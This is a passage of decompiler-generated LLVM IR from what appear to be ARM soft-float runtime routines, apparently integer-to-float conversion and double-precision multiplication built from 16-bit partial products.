  %v1_15454 = phi i32 [ %v0_153bc, %.thread11..thread13_crit_edge ], [ %v1_1544827, %bb41 ]
  %v0_15448 = phi i32 [ %v0_15448.pre, %.thread11..thread13_crit_edge ], [ %v1_15444, %bb41 ]
  %v4_15448 = mul i32 %v1_15454, 4096
  %v5_15448 = or i32 %v4_15448, %v0_15448
  %v7_15448 = icmp eq i32 %v5_15448, 0
  br i1 %v7_15448, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_1544c = load i32, i32* @r3, align 4
  %v2_1544c = load i32, i32* @r2, align 4
  %v5_1544c = mul i32 %v2_1544c, 4096
  %v6_1544c = or i32 %v5_1544c, %v1_1544c
  %v8_1544c = icmp eq i32 %v6_1544c, 0
  br i1 %v8_1544c, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_15450 = icmp eq i32 %v2_1544c, %v1_15454
  br i1 %v5_15450, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_15454 = or i32 %v1_15454, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_15458 = phi i32 [ %v1_15454, %bb43 ], [ %v2_15454, %.thread17 ]
  ret i32 %v11_15458

; uselistorder directives
  uselistorder i32 %v1_15454, { 2, 3, 0, 1 }
  uselistorder i32 %v1_15444, { 1, 0 }
  uselistorder i1 %v1_15400, { 1, 0 }
  uselistorder i32 %v1_153d0, { 2, 1, 0 }
  uselistorder i32 %v0_153c0, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_153bc, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_153d8, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_1545c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1545c:
  %v2_1545c = icmp eq i32 %arg1, 0
  br i1 %v2_1545c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1545c
  ret i32 0

.thread:                                          ; preds = %dec_label_pc_1545c
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_15480 = call i32 @function_152c4(i32 0)
  ret i32 %v1_15480

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_15484() local_unnamed_addr {
dec_label_pc_15484:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_15484 = load i32, i32* @r0, align 4
  %v2_15484 = icmp eq i32 %v0_15484, 0
  br i1 %v2_15484, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15484
  store i32 0, i32* @r1, align 4
  ret i32 0

.thread:                                          ; preds = %dec_label_pc_15484
  store i32 1074, i32* @r4, align 4
  %v1_1549c = and i32 %v0_15484, -2147483648
  store i32 %v1_1549c, i32* @r5, align 4
  %v2_1549c = icmp eq i32 %v1_1549c, 0
  br i1 %v2_1549c, label %bb20, label %bb19

bb19:                                             ; preds = %.thread
  %v2_154a0 = sub i32 0, %v0_15484
  store i32 %v2_154a0, i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %.thread, %bb19
  %v0_154a4 = phi i32 [ %v0_15484, %.thread ], [ %v2_154a0, %bb19 ]
  store i32 %v0_154a4, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_154ac = call i32 @function_152c4(i32 0)
  %v2_154b0 = mul i32 %v1_154ac, 2
  %v4_154b0 = icmp eq i32 %v2_154b0, 0
  %v1_154b4 = and i32 %v2_154b0, 4
  %v2_154b4 = icmp ne i32 %v1_154b4, 0
  %v3_154b4 = sdiv i32 %v2_154b0, 8
  %v3_154b8 = zext i1 %v2_154b4 to i32
  %v6_154b8 = zext i32 %v3_154b4 to i64
  %v7_154b8 = sub nsw i32 33, %v3_154b4
  %v8_154b8 = zext i32 %v7_154b8 to i64
  %v9_154b8 = shl i64 %v6_154b8, %v8_154b8
  %v10_154b8 = sub nsw i32 32, %v3_154b4
  %v11_154b8 = shl i32 %v3_154b8, %v10_154b8
  %v12_154b8 = zext i32 %v11_154b8 to i64
  %v14_154b8 = or i64 %v12_154b8, %v9_154b8
  %v15_154b8 = trunc i64 %v14_154b8 to i32
  store i32 %v15_154b8, i32* %r0.global-to-local, align 4
  %v3_154bc = mul i32 %v1_154ac, 536870912
  store i32 %v3_154bc, i32* @r1, align 4
  br i1 %v4_154b0, label %.thread3, label %bb21

bb21:                                             ; preds = %bb20
  %v4_154c0 = icmp ult i32 %v2_154b0, 16777216
  br i1 %v4_154c0, label %bb25, label %bb22

bb22:                                             ; preds = %bb21
  %v4_154d435 = icmp ugt i32 %v2_154b0, -16777217
  br i1 %v4_154d435, label %bb24.thread, label %bb23

bb24.thread:                                      ; preds = %bb22
  br label %.thread4

bb23:                                             ; preds = %bb22
  %v2_154c87 = xor i32 %v15_154b8, 939524096
  store i32 %v2_154c87, i32* %r0.global-to-local, align 4
  ret i32 %v2_154c87

.thread3:                                         ; preds = %bb20
  br label %.thread4

.thread4:                                         ; preds = %bb24.thread, %bb25, %.thread3
  %merge = phi i32 [ %v15_154b8, %.thread3 ], [ %v1_154ec, %bb25 ], [ %v15_154b8, %bb24.thread ]
  ret i32 %merge

bb25:                                             ; preds = %bb21
  store i32 896, i32* @r4, align 4
  %v1_154e4 = and i32 %v15_154b8, -2147483648
  store i32 %v1_154e4, i32* @r5, align 4
  %tmp = bitcast i32 %v15_154b8 to float
  %tmp36 = call float @fabsf(float %tmp)
  %v1_154e8 = bitcast float %tmp36 to i32
  store i32 %v1_154e8, i32* %r0.global-to-local, align 4
  %v1_154ec = call i32 @function_152c4(i32 %v1_154e8)
  store i32 %v1_154ec, i32* %r0.global-to-local, align 4
  %v1_154f0 = load i32, i32* @r1, align 4
  %v2_154f0 = or i32 %v1_154f0, %v1_154ec
  %v4_154f0 = icmp eq i32 %v2_154f0, 0
  br i1 %v4_154f0, label %.thread4, label %dec_label_pc_15520

dec_label_pc_15520:                               ; preds = %bb25
  store i32 0, i32* @r5, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  store i32 %v1_154f0, i32* %r0.global-to-local, align 4
  store i32 %v1_154ec, i32* %r1.global-to-local, align 4
  %tmp37 = icmp ult i32 %v1_154f0, 4194304
  call void @__pseudo_cond_branch(i1 %tmp37, i32 ptrtoint (i32* @global_var_15268.639 to i32))
  %tmp38 = icmp ult i32 %v1_154f0, 33554432
  br i1 %tmp38, label %bb27, label %bb26

bb26:                                             ; preds = %dec_label_pc_15520
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_15520, %bb26
  %v1_1554c = phi i32 [ 3, %dec_label_pc_15520 ], [ 6, %bb26 ]
  %tmp39 = icmp ult i32 %v1_154f0, 268435456
  br i1 %tmp39, label %bb29, label %bb28

bb28:                                             ; preds = %bb27
  %v2_1554c = add nuw nsw i32 %v1_1554c, 3
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v0_15550 = phi i32 [ %v1_1554c, %bb27 ], [ %v2_1554c, %bb28 ]
  %not. = icmp slt i32 %v1_154f0, 0
  %v4_15550 = zext i1 %not. to i32
  %v5_15550 = add nsw i32 %v0_15550, %v4_15550
  %v1_15554 = sub nsw i32 32, %v5_15550
  %v0_15558 = load i32, i32* %r1.global-to-local, align 4
  %v6_15558 = shl i32 %v0_15558, %v1_15554
  store i32 %v6_15558, i32* @ip, align 4
  %v6_1555c = lshr i32 %v0_15558, %v5_15550
  %v1_15560 = load i32, i32* %r0.global-to-local, align 4
  %v7_15560 = shl i32 %v1_15560, %v1_15554
  %v8_15560 = or i32 %v7_15560, %v6_1555c
  store i32 %v8_15560, i32* %r1.global-to-local, align 4
  %v6_15564 = lshr i32 %v1_15560, %v5_15550
  store i32 %v6_15564, i32* %r0.global-to-local, align 4
  %v0_15568 = load i32, i32* %r4.global-to-local, align 4
  %v2_15568 = add i32 %v0_15568, %v5_15550
  store i32 %v2_15568, i32* @r4, align 4
  %v4_1556c = sext i32 %v8_15560 to i64
  %v5_1556c = call i32 @function_15268(i32 %v6_15564, i64 %v4_1556c, i32 %v5_15550, i32 %v1_15554)
  store i32 %v5_1556c, i32* %r0.global-to-local, align 4
  ret i32 %v5_1556c

; uselistorder directives
  uselistorder i32 %v5_15550, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_154f0, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v1_154ec, { 2, 1, 3, 0 }
  uselistorder i32 %v1_154e8, { 1, 0 }
  uselistorder i32 %v15_154b8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v3_154b4, { 1, 2, 0 }
  uselistorder i32 %v2_154b0, { 1, 0, 4, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 1, 2, 5, 3, 9, 4, 7, 8 }
  uselistorder i32 6, { 1, 13, 14, 15, 9, 10, 2, 16, 17, 3, 4, 5, 19, 6, 7, 18, 0, 8, 11, 12 }
  uselistorder i32 3, { 53, 21, 50, 67, 51, 68, 52, 14, 27, 28, 60, 23, 61, 62, 24, 63, 64, 15, 69, 0, 30, 29, 39, 3, 2, 1, 4, 65, 31, 5, 6, 16, 7, 8, 40, 41, 75, 42, 43, 44, 45, 46, 47, 70, 12, 32, 71, 33, 9, 13, 54, 76, 22, 55, 73, 74, 17, 66, 18, 19, 11, 20, 72, 10, 48, 25, 49, 26, 34, 35, 36, 56, 57, 58, 37, 59, 38 }
  uselistorder i32 (i32)* @function_152c4, { 1, 0, 2 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %.thread4, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_15570(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15570:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15570 = load i32, i32* @r4, align 4
  store i32 %v3_15570, i32* %stack_var_-16, align 4
  %v6_15570 = load i32, i32* @r5, align 4
  %v9_15570 = load i32, i32* @r6, align 4
  store i32 2047, i32* @ip, align 4
  %v4_1557c = udiv i32 %arg1, 1048576
  %v5_1557c = urem i32 %v4_1557c, 2048
  store i32 %v5_1557c, i32* %r4.global-to-local, align 4
  %v6_1557c = icmp eq i32 %v5_1557c, 0
  br i1 %v6_1557c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_15570
  %v5_15580 = udiv i32 %arg3, 1048576
  %v6_15580 = urem i32 %v5_15580, 2048
  store i32 %v6_15580, i32* @r5, align 4
  %v7_15580 = icmp eq i32 %v6_15580, 0
  br i1 %v7_15580, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_15584 = icmp eq i32 %v5_1557c, 2047
  br i1 %v5_15584, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_15588 = icmp eq i32 %v6_15580, 2047
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15570, %bb, %bb41, %bb42
  %v0_1558c = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_15588, %bb42 ], [ true, %dec_label_pc_15570 ]
  store i32 87440, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v0_1558c, i32 ptrtoint (i32* @global_var_1580c.641 to i32))
  %v0_15590 = load i32, i32* %r4.global-to-local, align 4
  %v1_15590 = load i32, i32* @r5, align 4
  %v2_15590 = add i32 %v1_15590, %v0_15590
  store i32 %v2_15590, i32* %r4.global-to-local, align 4
  %v2_15594 = xor i32 %arg3, %arg1
  %v1_15598 = load i32, i32* @ip, align 4
  %tmp = mul i32 %v1_15598, -2097152
  %v5_15598 = add i32 %tmp, -1
  %v6_15598 = and i32 %v5_15598, %arg1
  store i32 %v6_15598, i32* %r0.global-to-local, align 4
  %v6_1559c = and i32 %v5_15598, %arg3
  store i32 %v6_1559c, i32* %r2.global-to-local, align 4
  %v4_155a0 = mul i32 %arg1, 4096
  %v5_155a0 = or i32 %v4_155a0, %arg2
  store i32 %v5_155a0, i32* @r5, align 4
  %v7_155a0 = icmp eq i32 %v5_155a0, 0
  br i1 %v7_155a0, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_155a817 = or i32 %v6_15598, 1048576
  store i32 %v1_155a817, i32* %r0.global-to-local, align 4
  %v1_155ac18 = or i32 %v6_1559c, 1048576
  store i32 %v1_155ac18, i32* %r2.global-to-local, align 4
  %v1_156e419 = and i32 %v2_15594, -2147483648
  store i32 %v1_156e419, i32* @r6, align 4
  br label %dec_label_pc_156e4

bb43:                                             ; preds = %.thread1
  %v5_155a4 = mul i32 %arg3, 4096
  %v6_155a4 = or i32 %v5_155a4, %arg4
  store i32 %v6_155a4, i32* @r5, align 4
  %v8_155a4 = icmp eq i32 %v6_155a4, 0
  %v1_155a8 = or i32 %v6_15598, 1048576
  store i32 %v1_155a8, i32* %r0.global-to-local, align 4
  %v1_155ac = or i32 %v6_1559c, 1048576
  store i32 %v1_155ac, i32* %r2.global-to-local, align 4
  %v1_156e4 = and i32 %v2_15594, -2147483648
  store i32 %v1_156e4, i32* @r6, align 4
  br i1 %v8_155a4, label %dec_label_pc_156e4, label %dec_label_pc_155b4

dec_label_pc_155b4:                               ; preds = %bb43
  store i32 %v1_156e4, i32* %stack_var_-40, align 4
  %v6_155b8 = load i32, i32* @r7, align 4
  %v9_155b8 = load i32, i32* @r8, align 4
  %v12_155b8 = load i32, i32* @sb, align 4
  %v15_155b8 = load i32, i32* @sl, align 4
  %v3_155bc = udiv i32 %arg2, 65536
  %v3_155c0 = udiv i32 %arg4, 65536
  store i32 %v3_155c0, i32* %r8.global-to-local, align 4
  %v3_155c4 = udiv i32 %v1_155a8, 65536
  store i32 %v3_155c4, i32* %sb.global-to-local, align 4
  %v3_155c8 = udiv i32 %v1_155ac, 65536
  %tmp59 = mul i32 %v3_155bc, -65536
  %v5_155cc = add i32 %tmp59, -1
  %v6_155cc = and i32 %v5_155cc, %arg2
  store i32 %v6_155cc, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_155c0, -65536
  %v5_155d0 = add i32 %tmp60, -1
  %v6_155d0 = and i32 %v5_155d0, %arg4
  %tmp61 = mul i32 %v3_155c4, -65536
  %v5_155d4 = add i32 %tmp61, -1
  %v6_155d4 = and i32 %v6_15598, %v5_155d4
  store i32 %v6_155d4, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_155c8, -65536
  %v5_155d8 = add i32 %tmp62, -1
  %v6_155d8 = and i32 %v6_1559c, %v5_155d8
  store i32 %v6_155d8, i32* %r2.global-to-local, align 4
  %v2_155dc = mul i32 %v6_155d0, %v6_155cc
  %v2_155e0 = mul i32 %v3_155c0, %v6_155cc
  %v2_155ec = and i32 %v2_155e0, 32768
  %v3_155ec = icmp ne i32 %v2_155ec, 0
  %v4_155ec = udiv i32 %v2_155e0, 65536
  %v7_155ec = zext i1 %v3_155ec to i32
  %v2_155f0 = mul i32 %v6_155d0, %v3_155bc
  %tmp53 = add i32 %v2_155f0, %v2_155e0
  %tmp54 = mul i32 %tmp53, 65536
  %v5_155f4 = add i32 %tmp54, %v2_155dc
  store i32 %v5_155f4, i32* %ip.global-to-local, align 4
  %v2_155f8 = and i32 %v2_155f0, 32768
  %v3_155f8 = icmp ne i32 %v2_155f8, 0
  %v4_155f8 = udiv i32 %v2_155f0, 65536
  %v7_155f8 = zext i1 %v3_155f8 to i32
  %v2_155fc = mul i32 %v3_155c8, %v6_155cc
  %v2_15608 = and i32 %v2_155fc, 32768
  %v3_15608 = icmp ne i32 %v2_15608, 0
  %v4_15608 = udiv i32 %v2_155fc, 65536
  %v7_15608 = zext i1 %v3_15608 to i32
  %v8_15608 = add nuw nsw i32 %v7_15608, %v4_15608
  %v2_1560c = mul i32 %v6_155d8, %v3_155bc
  %v2_15614 = and i32 %v2_1560c, 32768
  %v3_15614 = icmp ne i32 %v2_15614, 0
  %v4_15614 = udiv i32 %v2_1560c, 65536
  %v6_15614 = add nuw nsw i32 %v8_15608, %v4_15614
  %v7_15614 = zext i1 %v3_15614 to i32
  %v8_15614 = add nuw nsw i32 %v6_15614, %v7_15614
  %v2_15618 = mul i32 %v3_155c0, %v6_155d4
  %v2_15620 = and i32 %v2_15618, 32768
  %v3_15620 = icmp ne i32 %v2_15620, 0
  %v4_15620 = udiv i32 %v2_15618, 65536
  %v6_15620 = add nuw nsw i32 %v8_15614, %v4_15620
  %v7_15620 = zext i1 %v3_15620 to i32
  %v8_15620 = add nuw nsw i32 %v6_15620, %v7_15620
  %v2_15624 = mul i32 %v6_155d0, %v3_155c4
  %v4_15628 = mul i32 %v2_15624, 65536
  %tmp55 = add i32 %v2_1560c, %v2_155fc
  %tmp56 = add i32 %tmp55, %v2_15618
  %tmp57 = mul i32 %tmp56, 65536
  %v8_155f8 = add nuw nsw i32 %v7_155ec, %v4_155ec
  %v5_15604 = add nuw nsw i32 %v8_155f8, %v4_155f8
  %v5_15610 = add nuw nsw i32 %v5_15604, %v7_155f8
  %v5_1561c = add i32 %v5_15610, %v4_15628
  %v5_15628 = add i32 %v5_1561c, %tmp57
  %v2_1562c = and i32 %v2_15624, 32768
  %v3_1562c = icmp ne i32 %v2_1562c, 0
  %v4_1562c = udiv i32 %v2_15624, 65536
  %v6_1562c = add nuw nsw i32 %v8_15620, %v4_1562c
  %v7_1562c = zext i1 %v3_1562c to i32
  %v8_1562c = add i32 %v6_1562c, %v7_1562c
  %v2_15630 = mul i32 %v3_155c8, %v6_155d4
  %v2_15634 = mul nuw i32 %v3_155c8, %v3_155c4
  %v4_15638 = mul i32 %v2_15630, 65536
  %v5_15638 = add i32 %v8_1562c, %v4_15638
  %v2_1563c = and i32 %v2_15630, 32768
  %v3_1563c = icmp ne i32 %v2_1563c, 0
  %v4_1563c = udiv i32 %v2_15630, 65536
  %v6_1563c = add i32 %v4_1563c, %v2_15634
  %v7_1563c = zext i1 %v3_1563c to i32
  %v2_15640 = mul i32 %v6_155d8, %v3_155c4
  %v4_15644 = mul i32 %v2_15640, 65536
  %v5_15644 = add i32 %v5_15638, %v4_15644
  %v2_15648 = and i32 %v2_15640, 32768
  %v3_15648 = icmp ne i32 %v2_15648, 0
  %v4_15648 = udiv i32 %v2_15640, 65536
  %v7_15648 = zext i1 %v3_15648 to i32
  %v2_1564c = mul i32 %v6_155cc, %v6_155d8
  %v2_15650 = add i32 %v2_1564c, %v5_15628
  %v3_15650 = icmp ult i32 %v2_15650, %v5_15628
  %v2_15654 = mul nuw i32 %v3_155bc, %v3_155c8
  %v3_15658 = add i32 %v5_15644, %v2_15654
  %v4_15658 = zext i1 %v3_15650 to i32
  %v5_15658 = add i32 %v4_15658, %v3_15658
  %v9_15658 = icmp ule i32 %v5_15658, %v5_15644
  %v10_15658 = icmp ult i32 %v3_15658, %v5_15644
  %v11_15658 = select i1 %v3_15650, i1 %v9_15658, i1 %v10_15658
  %v2_1565c = mul i32 %v6_155d0, %v6_155d4
  %v2_15660 = zext i1 %v11_15658 to i32
  %v2_15664 = add i32 %v2_1565c, %v2_15650
  %v3_15664 = icmp ult i32 %v2_15664, %v2_15650
  %v0_15668 = load i32, i32* %sb.global-to-local, align 4
  %v1_15668 = load i32, i32* %r8.global-to-local, align 4
  %v2_15668 = mul i32 %v1_15668, %v0_15668
  %v3_1566c = add i32 %v2_15668, %v5_15658
  %v4_1566c = zext i1 %v3_15664 to i32
  %v5_1566c = add i32 %v4_1566c, %v3_1566c
  %v9_1566c = icmp ule i32 %v5_1566c, %v5_15658
  %v10_1566c = icmp ult i32 %v3_1566c, %v5_15658
  %v11_1566c = select i1 %v3_15664, i1 %v9_1566c, i1 %v10_1566c
  %v2_15670 = mul i32 %v1_15668, %v3_155bc
  %v2_15674 = zext i1 %v11_1566c to i32
  %v8_1563c = add i32 %v6_1563c, %v4_15648
  %v6_15648 = add i32 %v8_1563c, %v7_1563c
  %v8_15648 = add i32 %v6_15648, %v7_15648
  %v3_15660 = add i32 %v8_15648, %v2_15660
  %v3_15674 = add i32 %v3_15660, %v2_15674
  %v2_15678 = add i32 %v2_15670, %v2_15664
  %v3_15678 = icmp ult i32 %v2_15678, %v2_15664
  %v1_1567c = load i32, i32* %r2.global-to-local, align 4
  %v2_1567c = mul i32 %v1_1567c, %v6_155d4
  %v3_15680 = add i32 %v5_1566c, %v2_1567c
  %v4_15680 = zext i1 %v3_15678 to i32
  %v5_15680 = add i32 %v4_15680, %v3_15680
  %v9_15680 = icmp ule i32 %v5_15680, %v5_1566c
  %v10_15680 = icmp ult i32 %v3_15680, %v5_1566c
  %v11_15680 = select i1 %v3_15678, i1 %v9_15680, i1 %v10_15680
  %v2_15684 = zext i1 %v11_15680 to i32
  %v3_15684 = add i32 %v2_15684, %v3_15674
  %v2_15688 = load i32, i32* %stack_var_-40, align 4
  store i32 %v6_155b8, i32* @r7, align 4
  store i32 %v9_155b8, i32* @r8, align 4
  store i32 %v12_155b8, i32* @sb, align 4
  store i32 %v15_155b8, i32* @sl, align 4
  %v0_1568c = load i32, i32* %ip.global-to-local, align 4
  %v2_1568c = icmp eq i32 %v0_1568c, 0
  br i1 %v2_1568c, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_155b4
  %v2_15690 = or i32 %v2_15678, 1
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_155b4, %bb44
  %v0_156a4 = phi i32 [ %v2_15678, %dec_label_pc_155b4 ], [ %v2_15690, %bb44 ]
  %v0_15694 = load i32, i32* %r4.global-to-local, align 4
  %v1_15694 = add i32 %v0_15694, -255
  %v2_15698 = icmp ugt i32 %v3_15684, 511
  %v2_1569c = icmp eq i1 %v2_15698, false
  %v5_1569c = sext i1 %v2_1569c to i32
  %v3_1569c = add nsw i32 %v5_1569c, -1023
  %v6_1569c = add i32 %v3_1569c, %v0_15694
  store i32 %v6_1569c, i32* %r4.global-to-local, align 4
  %v3_156a0 = icmp ugt i32 %v1_15694, 768
  br i1 %v3_156a0, label %dec_label_pc_156b0, label %dec_label_pc_156a4

dec_label_pc_156a4:                               ; preds = %bb45
  %v1_156a4 = icmp slt i32 %v0_156a4, 0
  %v2_156a4 = mul i32 %v0_156a4, 2
  %v3_156a8 = mul i32 %v5_15680, 2
  %v4_156a8 = zext i1 %v1_156a4 to i32
  %v5_156a8 = or i32 %v4_156a8, %v3_156a8
  %v9_156a8 = icmp ule i32 %v5_156a8, %v5_15680
  %v10_156a8 = icmp ult i32 %v3_156a8, %v5_15680
  %v11_156a8 = select i1 %v1_156a4, i1 %v9_156a8, i1 %v10_156a8
  %v3_156ac = mul i32 %v3_15684, 2
  %v4_156ac = zext i1 %v11_156a8 to i32
  %v5_156ac = or i32 %v4_156ac, %v3_156ac
  br label %dec_label_pc_156b0

dec_label_pc_156b0:                               ; preds = %bb45, %dec_label_pc_156a4
  %v0_156c0 = phi i32 [ %v0_156a4, %bb45 ], [ %v2_156a4, %dec_label_pc_156a4 ]
  %v0_156b8 = phi i32 [ %v5_15680, %bb45 ], [ %v5_156a8, %dec_label_pc_156a4 ]
  %v1_156b0 = phi i32 [ %v3_15684, %bb45 ], [ %v5_156ac, %dec_label_pc_156a4 ]
  %v4_156b0 = mul i32 %v1_156b0, 2048
  %v4_156b4 = udiv i32 %v0_156b8, 2097152
  %v5_156b0 = or i32 %v4_156b4, %v2_15688
  %v5_156b4 = or i32 %v5_156b0, %v4_156b0
  store i32 %v5_156b4, i32* %r0.global-to-local, align 4
  %v3_156b8 = mul i32 %v0_156b8, 2048
  %v4_156bc = udiv i32 %v0_156c0, 2097152
  %v5_156bc = or i32 %v3_156b8, %v4_156bc
  store i32 %v5_156bc, i32* %r1.global-to-local, align 4
  %v3_156c0 = mul i32 %v0_156c0, 2048
  store i32 %v3_156c0, i32* @lr, align 4
  %v1_156c4 = add i32 %v6_1569c, -253
  store i32 %v1_156c4, i32* @ip, align 4
  %v2_156c4 = icmp ugt i32 %v6_1569c, 252
  %v7_156c4 = icmp eq i32 %v6_1569c, 253
  %v2_156c8 = xor i1 %v7_156c4, true
  %v3_156c8 = and i1 %v2_156c4, %v2_156c8
  br i1 %v3_156c8, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_156b0
  %v6_156c8 = icmp ugt i32 %v1_156c4, 1791
  %v11_156c8 = icmp eq i32 %v1_156c4, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_156b0, %bb46
  %v1_156cc = phi i1 [ %v7_156c4, %dec_label_pc_156b0 ], [ %v11_156c8, %bb46 ]
  %v0_156cc = phi i1 [ %v2_156c4, %dec_label_pc_156b0 ], [ %v6_156c8, %bb46 ]
  %v2_156cc = xor i1 %v1_156cc, true
  %v3_156cc = and i1 %v0_156cc, %v2_156cc
  call void @__pseudo_cond_branch(i1 %v3_156cc, i32 ptrtoint (i32* @global_var_15710.642 to i32))
  %v0_156d0 = load i32, i32* @lr, align 4
  %v2_156d0 = icmp slt i32 %v0_156d0, 0
  %v6_156d0 = icmp eq i32 %v0_156d0, -2147483648
  %v1_156d4 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_156d0, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_156d4 = urem i32 %v1_156d4, 2
  %v3_156d4 = icmp ne i32 %v2_156d4, 0
  %v4_156d4 = udiv i32 %v1_156d4, 2
  store i32 %v4_156d4, i32* @lr, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_156d8 = phi i1 [ %v3_156d4, %bb48 ], [ %v2_156d0, %bb47 ]
  %v2_156d8 = zext i1 %v1_156d8 to i32
  %v3_156d8 = add i32 %v2_156d8, %v1_156d4
  store i32 %v3_156d8, i32* @r1, align 4
  %v0_156dc = load i32, i32* %r0.global-to-local, align 4
  %v1_156dc = load i32, i32* %r4.global-to-local, align 4
  %v2_156dc = and i32 %v1_156dc, 4096
  %v3_156dc = icmp ne i32 %v2_156dc, 0
  %v4_156dc = mul i32 %v1_156dc, 1048576
  %v6_156dc = add i32 %v4_156dc, %v0_156dc
  %v7_156dc = zext i1 %v3_156dc to i32
  %v8_156dc = add i32 %v7_156dc, %v6_156dc
  store i32 %v8_156dc, i32* %r0.global-to-local, align 4
  %v2_156e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_156e0, i32* @r4, align 4
  store i32 %v6_15570, i32* @r5, align 4
  store i32 %v9_15570, i32* @r6, align 4
  ret i32 %v8_156dc

dec_label_pc_156e4:                               ; preds = %.thread, %bb43
  %v1_156e422 = phi i32 [ %v1_156e419, %.thread ], [ %v1_156e4, %bb43 ]
  %v1_155ac21 = phi i32 [ %v1_155ac18, %.thread ], [ %v1_155ac, %bb43 ]
  %v1_155a820 = phi i32 [ %v1_155a817, %.thread ], [ %v1_155a8, %bb43 ]
  %v2_156e8 = or i32 %v1_155a820, %v1_156e422
  %v2_156ec = or i32 %arg4, %arg2
  store i32 %v2_156ec, i32* @r1, align 4
  %v2_156f0 = xor i32 %v2_156e8, %v1_155ac21
  store i32 %v2_156f0, i32* %r0.global-to-local, align 4
  %v4_156f4 = udiv i32 %v1_15598, 2
  %v5_156f4 = sub i32 %v2_15590, %v4_156f4
  store i32 %v5_156f4, i32* %r4.global-to-local, align 4
  %v7_156f4 = sub i32 0, %v5_156f4
  %v8_156f4 = and i32 %v2_15590, %v7_156f4
  %v11_156f4 = icmp eq i32 %v2_15590, %v4_156f4
  %v7_156f8 = icmp sgt i32 %v2_15590, %v4_156f4
  br i1 %v7_156f8, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_156e4
  %v10_156f8 = sub i32 %v1_15598, %v5_156f4
  store i32 %v10_156f8, i32* @r5, align 4
  %v12_156f8 = xor i32 %v5_156f4, %v1_15598
  %v13_156f8 = xor i32 %v10_156f8, %v1_15598
  %v14_156f8 = and i32 %v13_156f8, %v12_156f8
  %v17_156f8 = icmp eq i32 %v1_15598, %v5_156f4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_156e4, %bb49
  %v2_15700.in = phi i32 [ %v8_156f4, %dec_label_pc_156e4 ], [ %v14_156f8, %bb49 ]
  %v1_15700.in = phi i32 [ %v5_156f4, %dec_label_pc_156e4 ], [ %v10_156f8, %bb49 ]
  %v0_15700 = phi i1 [ %v11_156f4, %dec_label_pc_156e4 ], [ %v17_156f8, %bb49 ]
  %v1_15700 = icmp slt i32 %v1_15700.in, 0
  %v2_15700 = icmp slt i32 %v2_15700.in, 0
  %v3_156fc = xor i1 %v2_15700, %v1_15700
  %v4_156fc = or i1 %v0_15700, %v3_156fc
  br i1 %v4_156fc, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_156fc28 = mul i32 %v5_156f4, 1048576
  %v10_156fc29 = or i32 %v2_156f0, %v9_156fc28
  store i32 %v10_156fc29, i32* %r0.global-to-local, align 4
  %v7_15700 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_15700, i32* @r4, align 4
  store i32 %v6_15570, i32* @r5, align 4
